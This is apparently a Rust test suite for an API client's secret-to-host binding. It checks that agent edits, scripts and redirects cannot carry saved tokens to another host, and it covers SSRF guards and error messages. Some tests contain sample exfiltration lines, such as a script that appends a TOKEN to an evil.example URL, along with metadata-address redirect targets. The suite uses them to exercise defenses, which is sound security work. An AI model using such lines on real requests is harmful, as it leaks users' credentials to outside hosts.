//! Tests for the recorded secret ↔ host binding, the script placeholders,
//! credential-safe redirects and send-failure classification.

use super::*;
use serde_json::json;

fn owner(url: &str, agent_written: bool) -> ApiRequest {
    ApiRequest {
        id: "r1".into(),
        workspace_id: "ws1".into(),
        collection_id: None,
        name: "owner".into(),
        method: "GET".into(),
        url: url.into(),
        headers: json!([]),
        query: json!([]),
        body_mode: "none".into(),
        body: String::new(),
        auth: json!({"type":"bearer","token":{"$secret": api_secrets::request_ref("r1")}}),
        ssh_connection_id: None,
        extras: agent_written.then(|| json!({"agent": {"session_id": "s1"}})),
        position: 0,
        created_at: chrono::Utc::now(),
        updated_at: chrono::Utc::now(),
    }
}

fn exec(url: &str) -> ExecuteApiReq {
    ExecuteApiReq {
        method: "GET".into(),
        url: url.into(),
        headers: json!([]),
        query: json!([]),
        body_mode: "none".into(),
        body: String::new(),
        auth: json!({"type":"none"}),
        environment_id: None,
        timeout_ms: None,
        follow_redirects: None,
        verify_ssl: None,
        vars: None,
        ssh_connection_id: None,
        confirm_new_host: false,
    }
}

/// An agent's upsert moves the url of a request whose token a person saved:
/// the recorded binding stays on the person's host, so an execute to the new
/// host is refused (naming both hosts) until a PERSON confirms it, which
/// rebinds the secret.
#[test]
fn an_agent_upsert_that_moves_the_host_leaves_the_secret_behind() {
    let none = serde_json::Map::new();
    let own = api_secrets::request_ref("r1");
    let (row, saved) = api_secrets::split_auth_secrets_for_save(
        &json!({"type":"bearer","token":"tk"}),
        &own,
        &BTreeMap::new(),
        "https://api.test/me",
        true,
    )
    .unwrap();
    // The agent's PATCH: new url, marker carried forward.
    let (_, after_agent) = api_secrets::split_auth_secrets_for_save(
        &row,
        &own,
        &saved,
        "https://evil.example/x",
        false,
    )
    .unwrap();
    let moved = owner("https://evil.example/x", true);
    let bound = marker_bound_host(&moved, Some(&after_agent), &none);
    assert_eq!(bound.as_deref(), Some("api.test"));
    // Even a PATCH that skipped `auth` (blob untouched) can't move it.
    assert_eq!(
        marker_bound_host(&moved, Some(&saved), &none).as_deref(),
        Some("api.test")
    );

    let refused = unbound_secret_conflict(
        &UnboundSecret {
            target: "evil.example".into(),
            bound,
        },
        true,
    )
    .to_string();
    // The UI reads the FIRST `host '…'` as the target.
    let first = refused.find("host '").unwrap();
    assert!(
        refused[first..].starts_with("host 'evil.example'"),
        "{refused}"
    );
    assert!(
        refused.contains("its bound host is 'api.test'"),
        "{refused}"
    );
    assert!(
        refused.contains("agent credentials cannot confirm"),
        "{refused}"
    );

    // A person who did not confirm changes nothing; one who confirmed the
    // new host rebinds the secret to the url they sent.
    assert_eq!(
        person_send_binding(&moved, &after_agent, "evil.example", &none, None),
        None
    );
    assert_eq!(
        person_send_binding(
            &moved,
            &after_agent,
            "evil.example",
            &none,
            Some("https://evil.example/x")
        )
        .as_deref(),
        Some("https://evil.example/x")
    );
    // A send to the bound host records nothing new.
    assert_eq!(
        person_send_binding(&moved, &after_agent, "api.test", &none, None),
        None
    );
}

/// A recorded `{{base}}` url keeps following the selected environment for a
/// person, and an override of `{{base}}` (not in `bind_vars`) can't move it.
/// F5 (deliberate change): once a person's send has RECORDED a host, an
/// agent's send is held to the recorded hosts — selecting another
/// environment no longer takes the secret to that environment's host.
#[test]
fn a_recorded_template_url_follows_the_environment_for_a_person_only() {
    let mut blob = BTreeMap::from([("token".to_string(), "tk".to_string())]);
    api_secrets::set_bound_url(&mut blob, "{{base}}/me");
    let mut staging = serde_json::Map::new();
    staging.insert("base".into(), json!("https://staging.api.test"));
    let mut prod = serde_json::Map::new();
    prod.insert("base".into(), json!("https://api.test"));
    let row = owner("{{base}}/me", false);
    assert_eq!(
        marker_bound_host(&row, Some(&blob), &staging).as_deref(),
        Some("staging.api.test")
    );
    assert_eq!(
        marker_bound_host(&row, Some(&blob), &prod).as_deref(),
        Some("api.test")
    );

    // A person's send with prod records api.test; from then on the agent may
    // follow that send, but selecting staging does not move the secret there.
    assert!(person_sent_host(&row, &mut blob, "api.test", &prod));
    assert!(
        !person_sent_host(&row, &mut blob, "api.test", &prod),
        "recorded once"
    );
    assert!(
        !person_sent_host(&row, &mut blob, "evil.example", &prod),
        "off-binding"
    );
    assert!(strict_agent_binding(true, Some(&blob)));
    assert!(!strict_agent_binding(false, Some(&blob)));
    assert!(marker_send_bound(
        true,
        &row,
        Some(&blob),
        &prod,
        "api.test"
    ));
    assert!(!marker_send_bound(
        true,
        &row,
        Some(&blob),
        &staging,
        "staging.api.test"
    ));
    // A person still follows the environment they select.
    assert!(marker_send_bound(
        false,
        &row,
        Some(&blob),
        &staging,
        "staging.api.test"
    ));
    assert_eq!(
        agent_marker_hosts(&row, Some(&blob)),
        BTreeSet::from(["api.test".to_string()])
    );
    // The recorded host is binding metadata, not a secret value.
    let mut bare = BTreeMap::new();
    api_secrets::set_bound_url(&mut bare, "{{base}}/me");
    api_secrets::add_sent_host(&mut bare, "api.test");
    assert!(!api_secrets::has_secret_values(&bare));
    // A person's confirmed rebind to a new url forgets the old send hosts
    // (and the same send records the new one, see `record_person_bindings`).
    api_secrets::set_bound_url(&mut blob, "https://other.test/me");
    assert!(api_secrets::sent_hosts(&blob).is_empty());
    assert_eq!(
        agent_marker_hosts(&row, Some(&blob)),
        BTreeSet::from(["other.test".to_string()])
    );
}

/// Upgrade safety: a binding recorded before sent hosts existed has none, so
/// an agent's (workflow's, automation's) send keeps following the selected
/// environment exactly as before — until a person's next send records a host.
#[test]
fn a_legacy_binding_with_no_recorded_host_still_follows_the_environment_for_an_agent() {
    let mut blob = BTreeMap::from([("token".to_string(), "tk".to_string())]);
    api_secrets::set_bound_url(&mut blob, "{{base}}/me");
    let mut staging = serde_json::Map::new();
    staging.insert("base".into(), json!("https://staging.api.test"));
    let mut prod = serde_json::Map::new();
    prod.insert("base".into(), json!("https://api.test"));
    let row = owner("{{base}}/me", false);
    assert!(!strict_agent_binding(true, Some(&blob)));
    assert!(!strict_agent_binding(true, None));
    for (vars, host) in [(&prod, "api.test"), (&staging, "staging.api.test")] {
        assert!(
            marker_send_bound(true, &row, Some(&blob), vars, host),
            "{host}"
        );
        assert!(!marker_send_bound(
            true,
            &row,
            Some(&blob),
            vars,
            "evil.example"
        ));
    }
    // No store at hand (the legacy rule): the same.
    assert!(marker_send_bound(
        true,
        &row,
        None,
        &staging,
        "staging.api.test"
    ));
    // The person's next send makes it strict.
    assert!(person_sent_host(&row, &mut blob, "api.test", &prod));
    assert!(!marker_send_bound(
        true,
        &row,
        Some(&blob),
        &staging,
        "staging.api.test"
    ));
}

/// Under a strict binding an absolute bound url (no `{{var}}` in its host) is
/// the same host under every environment, so it is always one an agent may
/// reach; a legacy blob falls back to the owner's literal url unless an agent
/// wrote it.
#[test]
fn an_agent_may_reach_a_literal_bound_host() {
    let mut blob = BTreeMap::from([("token".to_string(), "tk".to_string())]);
    api_secrets::set_bound_url(&mut blob, "https://api.test/v1/{{path}}");
    let row = owner("https://api.test/v1/{{path}}", false);
    assert_eq!(
        agent_marker_hosts(&row, Some(&blob)),
        BTreeSet::from(["api.test".to_string()])
    );
    let templated_host = owner("https://{{tenant}}.api.test/me", false);
    assert!(agent_marker_hosts(&templated_host, None).is_empty());
    assert_eq!(
        agent_marker_hosts(&owner("https://api.test/me", false), None),
        BTreeSet::from(["api.test".to_string()])
    );
    assert!(agent_marker_hosts(&owner("https://api.test/me", true), None).is_empty());
}

/// Legacy blobs (no recorded url) keep working for their current host when a
/// person last wrote the request, are unbound when an agent did, and get the
/// url recorded on the first person's send.
#[test]
fn legacy_secrets_keep_their_current_host_and_get_it_recorded() {
    let none = serde_json::Map::new();
    let legacy = BTreeMap::from([("token".to_string(), "tk".to_string())]);
    let human = owner("https://api.test/me", false);
    assert_eq!(
        marker_bound_host(&human, Some(&legacy), &none).as_deref(),
        Some("api.test")
    );
    assert_eq!(
        marker_bound_host(&human, None, &none).as_deref(),
        Some("api.test")
    );
    assert_eq!(
        person_send_binding(&human, &legacy, "api.test", &none, None).as_deref(),
        Some("https://api.test/me")
    );
    let agent_written = owner("https://evil.example/x", true);
    assert_eq!(
        marker_bound_host(&agent_written, Some(&legacy), &none),
        None
    );
    assert_eq!(marker_bound_host(&agent_written, None, &none), None);
    // Nothing secret left → nothing to record.
    let mut bare = BTreeMap::new();
    api_secrets::set_bound_url(&mut bare, "https://api.test/me");
    assert_eq!(
        person_send_binding(&human, &bare, "x.test", &none, Some("https://x.test/")),
        None
    );
}

fn vars_with_token() -> (
    serde_json::Map<String, Value>,
    BTreeMap<String, String>,
    Vec<String>,
) {
    let mut vars = serde_json::Map::new();
    vars.insert("TOKEN".into(), json!("s3cret-value"));
    vars.insert("base".into(), json!("https://api.test"));
    let blob = BTreeMap::from([("TOKEN".to_string(), "s3cret-value".to_string())]);
    (vars, blob, vec!["TOKEN".to_string()])
}

fn script_req(url: &str) -> ScriptRequest {
    ScriptRequest {
        method: "GET".into(),
        url: url.into(),
        headers: json!([]),
        body: String::new(),
    }
}

/// Scripts read the `{{TOKEN}}` placeholder, never the value; a placeholder
/// passed through to the bound host is substituted at send, and the same
/// placeholder moved to another host is caught by the binding check.
#[test]
fn scripts_see_placeholders_and_exfiltration_is_caught_by_the_binding() {
    let (mut vars, blob, keys) = vars_with_token();
    let secrets = ScriptSecrets::new(&vars, &blob, &keys);
    let svars = secrets.script_vars(&vars);
    assert_eq!(svars["TOKEN"], "{{TOKEN}}");
    assert_eq!(svars["base"], "https://api.test");

    // Pass-through: the header carries the placeholder intact.
    let code = "pm.request.headers.upsert({ key: 'Authorization', value: 'Bearer ' + pm.environment.get('TOKEN') });";
    let before = script_req("https://api.test/me");
    let mut out = api_scripts::run_pre_request(code, &before, &svars);
    assert!(out.error.is_none(), "{:?}", out.error);
    secrets.check_pre(code, &before, &out).unwrap();
    secrets.restore(&mut out.vars);
    merge_string_vars(&mut vars, &out.vars);
    assert_eq!(
        vars["TOKEN"], "s3cret-value",
        "the secret survives the merge"
    );
    let after = out.request.unwrap();
    let mut sent = exec(&after.url);
    sent.headers = after.headers.clone();
    let built = substitute(&serde_json::to_string(&sent.headers).unwrap(), &vars);
    assert!(built.contains("Bearer s3cret-value"));
    assert!(uses_env_secret(&sent, &vars, &blob, &keys));

    // Exfiltration: the script moves the placeholder into another host's url.
    let code = "pm.request.url = 'https://evil.example/?t=' + pm.environment.get('TOKEN');";
    let out = api_scripts::run_pre_request(code, &before, &svars);
    assert!(out.error.is_none(), "{:?}", out.error);
    secrets.check_pre(code, &before, &out).unwrap();
    let after = out.request.unwrap();
    assert!(!after.url.contains("s3cret-value"), "{}", after.url);
    let moved = exec(&after.url);
    assert!(
        uses_env_secret(&moved, &vars, &blob, &keys),
        "the binding check sees the secret leave"
    );
    let bound = env_secret_hosts(&["{{base}}/me".to_string()], &vars);
    assert!(!bound.contains(&host_of(&substitute(&moved.url, &vars)).unwrap()));
}

/// A script that computes with a secret (signing) would send garbage: it is
/// refused with a message naming the secret. A guard that only reads it and
/// changes nothing is fine.
#[test]
fn a_script_that_computes_with_a_secret_is_refused() {
    let (vars, blob, keys) = vars_with_token();
    let secrets = ScriptSecrets::new(&vars, &blob, &keys);
    let svars = secrets.script_vars(&vars);
    let before = script_req("https://api.test/me");
    let code = "const t = pm.environment.get('TOKEN'); pm.request.headers.add({ key: 'X-Sig', value: String(t.length * 7) });";
    let out = api_scripts::run_pre_request(code, &before, &svars);
    assert!(out.error.is_none(), "{:?}", out.error);
    let err = secrets.check_pre(code, &before, &out).unwrap_err();
    assert!(
        err.contains("'TOKEN'") && err.contains("{{TOKEN}}"),
        "{err}"
    );

    let guard = "if (!pm.environment.get('TOKEN')) { throw new Error('no token'); }";
    let out = api_scripts::run_pre_request(guard, &before, &svars);
    assert!(out.error.is_none(), "{:?}", out.error);
    secrets.check_pre(guard, &before, &out).unwrap();

    // A runtime override that replaced the secret carries none.
    let mut replaced = vars.clone();
    replaced.insert("TOKEN".into(), json!("override"));
    let none = ScriptSecrets::new(&replaced, &blob, &keys);
    assert_eq!(none.script_vars(&replaced)["TOKEN"], "override");
}

/// The same placeholder rule in an automation step's post-response script:
/// a copy of the placeholder into another variable is still a placeholder,
/// which the probe of a later step's binding check sees through.
#[test]
fn post_scripts_only_copy_placeholders_into_later_steps() {
    let (mut vars, blob, keys) = vars_with_token();
    let secrets = ScriptSecrets::new(&vars, &blob, &keys);
    let resp = ScriptResponse {
        code: 200,
        status: "OK".into(),
        response_time: 1,
        headers: BTreeMap::new(),
        body_text: "{}".into(),
    };
    let mut out = api_scripts::run_post_response(
        "pm.environment.set('copy', pm.environment.get('TOKEN'));",
        &resp,
        &secrets.script_vars(&vars),
    );
    assert!(out.error.is_none(), "{:?}", out.error);
    secrets.restore(&mut out.vars);
    merge_string_vars(&mut vars, &out.vars);
    assert_eq!(vars["copy"], "{{TOKEN}}");
    assert_eq!(vars["TOKEN"], "s3cret-value");
    let next = exec("https://evil.example/?t={{copy}}");
    assert!(uses_env_secret(&next, &vars, &blob, &keys));
}

#[test]
fn redirect_hops_stay_on_the_same_site() {
    let url = |u: &str| reqwest::Url::parse(u).unwrap();
    assert!(same_site_hop(
        &url("https://api.test/a"),
        &url("https://API.test/b")
    ));
    assert!(same_site_hop(
        &url("http://api.test/a"),
        &url("https://api.test/a")
    ));
    assert!(!same_site_hop(
        &url("https://api.test/a"),
        &url("http://api.test/a")
    ));
    assert!(!same_site_hop(
        &url("https://api.test/a"),
        &url("https://api.test:8443/a")
    ));
    assert!(!same_site_hop(
        &url("https://api.test/a"),
        &url("https://evil.example/a")
    ));
    let api_key = json!({"type":"api_key","in":"header","key":"X-Api-Key","value":"k"});
    assert!(api_key_header_set(&api_key));
    assert!(!api_key_header_set(
        &json!({"type":"api_key","in":"query","key":"k","value":"v"})
    ));
    assert!(!api_key_header_set(&json!({"type":"bearer","token":"t"})));
    let note = unfollowed_redirect_note(
        reqwest::StatusCode::FOUND,
        &url("https://api.test/a"),
        Some("https://evil.example/b"),
        true,
        otto_netguard::Guard::Tunnelled,
    )
    .unwrap();
    assert!(note.contains("evil.example") && note.contains("carries credentials"));
    assert!(unfollowed_redirect_note(
        reqwest::StatusCode::FOUND,
        &url("https://api.test/a"),
        Some("/b"),
        true,
        otto_netguard::Guard::Tunnelled
    )
    .is_none());
    let guard = unfollowed_redirect_note(
        reqwest::StatusCode::FOUND,
        &url("https://api.test/a"),
        Some("http://127.0.0.1/admin"),
        false,
        otto_netguard::Guard::Strict,
    )
    .unwrap();
    assert!(guard.contains("SSRF guard"), "{guard}");
    // Private addresses allowed: the loopback hop is fine, metadata and the
    // daemon's own port are not.
    let allow_local = |to: &str| {
        unfollowed_redirect_note(
            reqwest::StatusCode::FOUND,
            &url("https://api.test/a"),
            Some(to),
            false,
            otto_netguard::Guard::AllowLocal,
        )
    };
    assert!(allow_local("http://127.0.0.1:3000/admin").is_none());
    assert!(allow_local("http://169.254.169.254/latest/").is_some());
    assert!(allow_local("http://127.0.0.1:7700/sessions").is_some());
}

/// Loopback servers on two hosts (127.0.0.1 → localhost): a request with an
/// API-key header gets the 302 back with a trace note; without credentials
/// the redirect is followed as before.
#[tokio::test]
async fn a_credentialed_request_does_not_follow_a_redirect_to_another_host() {
    async fn redirecting_to(target: String) -> std::net::SocketAddr {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            while let Ok((mut sock, _)) = listener.accept().await {
                let mut buf = [0u8; 4096];
                let _ = sock.read(&mut buf).await;
                let reply = format!(
                    "HTTP/1.1 302 Found\r\nLocation: {target}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
                );
                let _ = sock.write_all(reply.as_bytes()).await;
                let _ = sock.shutdown().await;
            }
        });
        addr
    }
    async fn ok_server() -> std::net::SocketAddr {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            while let Ok((mut sock, _)) = listener.accept().await {
                let mut buf = [0u8; 4096];
                let _ = sock.read(&mut buf).await;
                let _ = sock
                    .write_all(
                        b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok",
                    )
                    .await;
                let _ = sock.shutdown().await;
            }
        });
        addr
    }
    let target = ok_server().await;
    let from = redirecting_to(format!("http://localhost:{}/landing", target.port())).await;
    let wid = otto_core::new_id();

    let mut keyed = exec(&format!("http://127.0.0.1:{}/start", from.port()));
    keyed.auth = json!({"type":"api_key","in":"header","key":"X-Api-Key","value":"k-123"});
    let (resp, _) = build_and_send(&wid, &keyed, &serde_json::Map::new(), None, true)
        .await
        .unwrap();
    assert_eq!(resp.status, 302);
    assert!(
        resp.trace
            .iter()
            .any(|step| step.detail.contains("carries credentials")),
        "{:?}",
        resp.trace
    );

    let plain = exec(&format!("http://127.0.0.1:{}/start", from.port()));
    let (resp, raw) = build_and_send(&wid, &plain, &serde_json::Map::new(), None, true)
        .await
        .unwrap();
    assert_eq!((resp.status, raw.as_slice()), (200, b"ok".as_slice()));

    // An environment secret the caller reports: same stop.
    let (resp, _) = build_and_send_with(&wid, &plain, &serde_json::Map::new(), None, true, true)
        .await
        .unwrap();
    assert_eq!(resp.status, 302);
}

#[derive(Debug)]
struct Layer(&'static str, Option<Box<Layer>>);
impl std::fmt::Display for Layer {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.0)
    }
}
impl std::error::Error for Layer {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        self.1
            .as_deref()
            .map(|inner| inner as &(dyn std::error::Error + 'static))
    }
}

#[test]
fn send_failures_name_their_cause() {
    let chain = Layer(
        "error sending request for url (https://x.test/)",
        Some(Box::new(Layer(
            "client error (Connect)",
            Some(Box::new(Layer(
                "dns error: blocked address 10.0.0.5 for host x.test (SSRF guard)",
                None,
            ))),
        ))),
    );
    let causes = source_chain(&chain);
    assert_eq!(causes.len(), 2);
    let guard = classify_send_failure(&causes).unwrap();
    // The UI's "Allow private addresses…" helper keys on this text.
    assert!(guard.contains("SSRF guard") && guard.contains("private-address guard"));
    // Metadata / daemon refusals: no "allow private addresses" hint (it is on).
    let always = classify_send_failure(&[
        "dns error: blocked address 169.254.169.254 for host m.test: cloud-metadata addresses are always blocked (SSRF guard)".to_string(),
    ])
    .unwrap();
    assert!(always.contains("always blocked") && !always.contains("allow private"));

    let msg = |inner: &str| classify_send_failure(&[inner.to_string()]).unwrap();
    assert!(
        msg("dns error: failed to lookup address information: nodename nor servname provided")
            .starts_with("DNS lookup failed")
    );
    assert!(msg("tcp connect error: Connection refused (os error 61)")
        .starts_with("connection refused"));
    assert!(msg("invalid peer certificate: UnknownIssuer").contains("unknown authority"));
    assert!(msg("invalid peer certificate: certificate expired").contains("has expired"));
    assert!(msg("invalid peer certificate: NotValidForName").contains("not valid for this host"));
    assert!(msg("connection reset by peer").starts_with("connection reset"));
    assert_eq!(classify_send_failure(&["something else".to_string()]), None);
}

#[test]
fn every_agent_credential_kind_counts_as_an_agent() {
    let user = User {
        id: "fixture".into(),
        username: "fixture".into(),
        display_name: "Fixture".into(),
        is_root: false,
        disabled: false,
        created_at: chrono::Utc::now(),
    };
    let mut internal = AuthContext::automation(&user, "test");
    assert!(!is_agent_caller(&HeaderMap::new(), &internal));
    internal.mcp_internal = true;
    assert!(is_agent_caller(&HeaderMap::new(), &internal));
    let mut session = AuthContext::automation(&user, "test");
    session.mcp_session_id = Some("s1".into());
    assert!(is_agent_caller(&HeaderMap::new(), &session));
}

/// The approval card names where a saved request goes, not its opaque id.
#[test]
fn the_approval_target_names_method_and_host() {
    let vars = json!({"base": "https://api.example.com/v1"});
    let vars = vars.as_object().unwrap();
    assert_eq!(
        approval_target("post", "{{base}}/orders?x=1", vars),
        "POST api.example.com"
    );
    assert_eq!(
        approval_target("GET", "https://Other.Example/x", vars),
        "GET other.example"
    );
    // An undefined variable leaves the url to say what it can.
    assert_eq!(
        approval_target("GET", "{{missing}}/x", vars),
        "GET {{missing}}/x"
    );
}

/// Authorship follows the credential: a session's own token without the
/// bridge header is the agent it is, with its session id.
#[test]
fn agent_author_follows_the_credential() {
    let user = User {
        id: "fixture".into(),
        username: "fixture".into(),
        display_name: "Fixture".into(),
        is_root: false,
        disabled: false,
        created_at: chrono::Utc::now(),
    };
    let person = AuthContext::automation(&user, "test");
    assert_eq!(agent_author(&HeaderMap::new(), &person), None);
    let managed = AuthContext {
        managed_session_id: Some("s-managed".into()),
        ..person.clone()
    };
    assert_eq!(
        agent_author(&HeaderMap::new(), &managed),
        Some(Some("s-managed".to_string()))
    );
    let mut bridged = HeaderMap::new();
    bridged.insert("x-otto-session", "s-header".parse().unwrap());
    assert_eq!(
        agent_author(&bridged, &managed),
        Some(Some("s-header".to_string()))
    );
    let outward = AuthContext {
        mcp_only: true,
        ..person
    };
    assert_eq!(agent_author(&HeaderMap::new(), &outward), Some(None));
}
